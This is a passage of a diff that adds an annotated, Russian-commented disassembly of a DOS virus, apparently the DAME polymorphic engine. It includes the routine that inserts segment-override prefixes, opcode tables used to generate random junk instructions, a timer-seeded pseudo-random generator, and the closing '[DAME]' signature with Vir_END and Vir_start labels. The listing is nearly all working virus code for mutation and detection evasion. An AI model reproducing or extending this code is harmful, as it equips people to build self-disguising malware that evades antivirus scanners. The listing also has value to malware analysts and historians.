+                                ; Т.к. все операции по модификации памяти генерируемые вирусом по умолчанию
+                                ; производятся в сегменте данных DS, а возможна ситуация, когда регистр DS
+                                ; может модифицироваться в полиморфном "мусоре", то необходимо подствавить ре-
+                                ; сегментный редиректор (CS: ли SS:). Но если DS не меняется, то тогда необхо-
+                                ; димо проверить : а не было ли случайного редиректора. И если таковой был то
+                                ; добавляем команду NOP перед вставкой инструкции модификации памяти.
+                                ; Примечание : Если в ИНФО-блоке осталось свободно менее 6 байтов, то процедура
+                                ;              снимает со стека не только обращение к себе но и обращение к вы-
+                                ;              зывающей процедуре
+                                ;------------------------------------------------------------------------------
+                                sub_0A14        proc    near
+     0A14  2E: A1 09EA                          mov     ax,cs:data_09EA
+     0A18  2E: 2B 06 0A03                       sub     ax,cs:data_0A03
+     0A1D  3D 0006                              cmp     ax,6                    ; Есть ли место в ИНФО-блоке ?
+     0A20  73 02                                jae     short loc_0A24          ; Jump if above or =
+     0A22  58                                   pop     ax
+
+     0A23                       loc_ret_0A23:
+     0A23  C3                                   retn
+                                ;------------------------------------------------------------------------------
+                                ; Место в ИНФО-блоке есть, можно вставлять редиректор сегментов.
+                                ; Примечание : data_0A25 - флаг модификации регистра DS
+                                ;                          = 0 - регистр DS не модифицируется
+                                ;                          = 1 - регистр DS модифицируется
+                                ;------------------------------------------------------------------------------
+     0A24                       loc_0A24:
+     0A24  B0 00                                mov     al,0
+                                data_0A25       =       byte ptr $ - 1
+     0A26  0A C0                                or      al,al                   ; DS меняется ?
+     0A28  74 0C                                jz      short loc_0A36          ; Jump if NO. Так как в этом
+                                                                                ;  случае редиректор не нужен
+                                                ; Выбираем какой сегментный регистр подставить ?
+     0A2A  E8 F918                              call    RND_01
+     0A2D  B0 2E                                mov     al,2Eh                  ; SEG CS
+     0A2F  74 02                                jz      short loc_0A33
+     0A31  B0 36                                mov     al,36h                  ; SEG SS
+     0A33                       loc_0A33:
+     0A33  E9 FC15                              jmp     loc_064B
+                                sub_0A14        endp
+
+                                ;==============================================================================
+                                ; Проверка на редиректор сегментов (была ли предыдущая команда редиректором)
+                                ;==============================================================================
+                                sub_0A36        proc    near
+     0A36                       loc_0A36:
+     0A36  8A 47 FF                             mov     al,[bx-1]            ; Выбрать предыдущую команду
+     0A39  24 E7                                and     al,not SEG_REGs      ; Выделить биты
+     0A3B  3C 26                                cmp     al,26h               ; Была операция подмены
+                                                                             ;  сегмента ? (ES:,SS:,CS:,DS:)
+     0A3D  75 E4                                jne     loc_ret_0A23
+     0A3F  B0 90                                mov     al,90h               ; Да. Подставляем NOP
+     0A41  EB F0                                jmp     short loc_0A33
+                                sub_0A36        endp
+
+     ;-------------------------------------------------------------------------------------------------------
+     0A43  02                   data_0A43       dop     00000000b, in_reg    ; ADD  r(8/16), r/m      (02,03)
+     0A44  0A                                   dop     00001000b, in_reg    ; OR   r(8/16), r/m      (0A,0B)
+     0A45  12                                   dop     00010000b, in_reg    ; ADC  r(8/16), r/m      (12,13)
+     0A46  1A                                   dop     00011000b, in_reg    ; SBB  r(8/16), r/m      (1A,1B)
+     0A47  22                                   dop     00100000b, in_reg    ; AND  r(8/16), r/m      (22,23)
+     0A48  2A                                   dop     00101000b, in_reg    ; SUB  r(8/16), r/m      (2A,2B)
+     0A49  32                                   dop     00110000b, in_reg    ; XOR  r(8/16), r/m      (32,33)
+     0A4A  38                                   dop     00111000b, out_reg   ; CMP  r/m, r(8/16)      (38,39)
+     0A4B  3A                                   dop     00111000b, in_reg    ; CMP  r(8/16), r/m      (3A,3B)
+     0A4C  84                                   dop     10000100b, out_reg   ; TEST r/m, r(8/16)      (84,85)
+     0A4D  8A                                   dop     10001000b, in_reg    ; MOV  r(8/16), r/m      (8A,8B)
+     0A4E  8E                                   dop     10001100b, in_reg    ; MOV  seg, r/m             (8E)
+     ;-------------------------------------------------------------------------------------------------------
+     0A4F  A0                   data_0A4F       db      10100000b            ; MOV  AL, [im8]         (A0,A1)
+     0A50  04                                   db      00000100b            ; ADD  AL,  im8          (04,05)
+     0A51  0C                                   db      00001100b            ; OR   AL,  im8          (0C,0D)
+     0A52  14                                   db      00010100b            ; ADC  AL,  im8          (14,15)
+     0A53  1C                                   db      00011100b            ; SBB  AL,  im8          (1C,1D)
+     0A54  24                                   db      00100100b            ; AND  AL,  im8          (24,25)
+     0A55  2C                                   db      00101100b            ; SUB  AL,  im8          (2C,2D)
+     0A56  34                                   db      00110100b            ; XOR  AL,  im8          (34,35)
+     0A57  3C                                   db      00111100b            ; CMP  AL,  im8          (3C,3D)
+     0A58  A8                                   db      10101000b            ; TEST AL, [im8]         (A8,A9)
+     ;-------------------------------------------------------------------------------------------------------
+     0A59  C5                   data_0A59       db      11000101b            ; LDS r16/mem               (C5)
+     0A5A  C4                                   db      11000100b            ; LES r16/mem               (C4)
+     0A5B  8D                                   db      10001101b            ; LEA r16/mem               (8D)
+     ;-------------------------------------------------------------------------------------------------------
+     0A5C  58                                   db      01011000b            ; POP   r16              (58-5F)
+     0A5D  50                   data_0A5D       db      01010000b            ; PUSH  r16              (50-57)
+     0A5E  48                                   db      01001000b            ; DEC   r16              (48-4F)
+     0A5F  40                                   db      01000000b            ; INC   r16              (40-47)
+     0A60  90                                   db      10010000b            ; NOP,  XCHG AX,r16      (90-97)
+     ;-------------------------------------------------------------------------------------------------------
+     0A61  9C                   data_0A61       db      10011100b            ; PUSHF                     (9C)
+     0A62  27                                   db      00100111b            ; DAA                       (27)
+     0A63  2F                                   db      00101111b            ; DAS                       (2F)
+     0A64  37                                   db      00110111b            ; AAA                       (37)
+     0A65  3F                                   db      00111111b            ; AAS                       (3F)
+     0A66  98                                   db      10011000b            ; CBW                       (98)
+     0A67  99                                   db      10011001b            ; CWD                       (99)
+     0A68  9E                                   db      10011110b            ; SAHF                      (9E)
+     0A69  9F                                   db      10011111b            ; LAHF                      (9F)
+     0A6A  A6                                   db      10100110b            ; CMPSB                     (A6)
+     0A6B  AC                                   db      10101100b            ; LODSB                     (AC)
+     0A6C  AE                                   db      10101110b            ; SCASB                     (AE)
+     0A6D  D7                                   db      11010111b            ; XLAT                      (D7)
+     0A6E  F5                                   db      11110101b            ; CMC                       (F5)
+     0A6F  F8                                   db      11111000b            ; CLC                       (F8)
+     0A70  F9                                   db      11111001b            ; STC                       (F9)
+     0A71  FA                                   db      11111010b            ; CLI                       (FA)
+     0A72  FB                                   db      11111011b            ; STI                       (FB)
+     0A73  FC                                   db      11111100b            ; CLD                       (FC)
+     0A74  FD                                   db      11111101b            ; STD                       (FD)
+     0A75  A7                                   db      10100111b            ; CMPSW                     (A7)
+     0A76  AD                                   db      10101101b            ; LODSW                     (AD)
+     0A77  AF                                   db      10101111b            ; SCASW                     (AF)
+     ;-------------------------------------------------------------------------------------------------------
+
+                                ;==========================================================================
+                                ; Инициализация генератора псевдослучайных чисел
+                                ;==========================================================================
+
+                                RANDOMIZE       proc    near
+     0A78  52                                   push    dx
+     0A79  51                                   push    cx
+     0A7A  B4 2C                                mov     ah,2Ch
+     0A7C  CD 21                                int     21h                     ; DOS Services  ah=function 2Ch
+                                                                                ;  get time, cx=hrs/min, dx=sec
+     0A7E  E4 40                                in      al,40h                  ; port 40h, 8253 timer 0 clock
+     0A80  8A E0                                mov     ah,al
+     0A82  E4 40                                in      al,40h                  ; port 40h, 8253 timer 0 clock
+     0A84  33 C1                                xor     ax,cx
+     0A86  33 D0                                xor     dx,ax
+     0A88  EB 1B                                jmp     short loc_0AA5
+                                ;==========================================================================
+                                ; Получение значения генератора псевдослучайных чисел
+                                RND:
+     0A8A  52                                   push    dx
+     0A8B  51                                   push    cx
+     0A8C  53                                   push    bx
+     0A8D  B8 ????                              mov     ax,1111h
+                                data_0A8E       =       word ptr $ - 2
+     0A90  BA ????                              mov     dx,1111h
+                                data_0A91       =       word ptr $ - 2
+     0A93  B9 0007                              mov     cx,7
+     0A96                       locloop_0A96:
+     0A96  D1 E0                                shl     ax,1                    ; Shift w/zeros fill
+     0A98  D1 D2                                rcl     dx,1                    ; Rotate thru carry
+     0A9A  8A D8                                mov     bl,al
+     0A9C  32 DE                                xor     bl,dh
+     0A9E  79 02                                jns     short loc_0AA2          ; Jump if not sign
+     0AA0  FE C0                                inc     al
+     0AA2                       loc_0AA2:
+     0AA2  E2 F2                                loop    locloop_0A96            ; Loop if cx > 0
+     0AA4  5B                                   pop     bx
+     0AA5                       loc_0AA5:
+     0AA5  2E: A3 0A8E                          mov     cs:data_0A8E,ax
+     0AA9  2E: 89 16 0A91                       mov     cs:data_0A91,dx
+     0AAE  8A C2                                mov     al,dl
+     0AB0  59                                   pop     cx
+     0AB1  5A                                   pop     dx
+     0AB2  C3                                   retn
+                                RANDOMIZE       endp
+
+     0AB3  5B 44 41 4D 45 5D                    db      '[DAME] [DAME]'
+     0AB9  20 5B 44 41 4D 45
+     0ABF  5D
+                                Vir_END         equ     $
+                                seg_a           ends
+
+
+
+                                                end     Vir_start
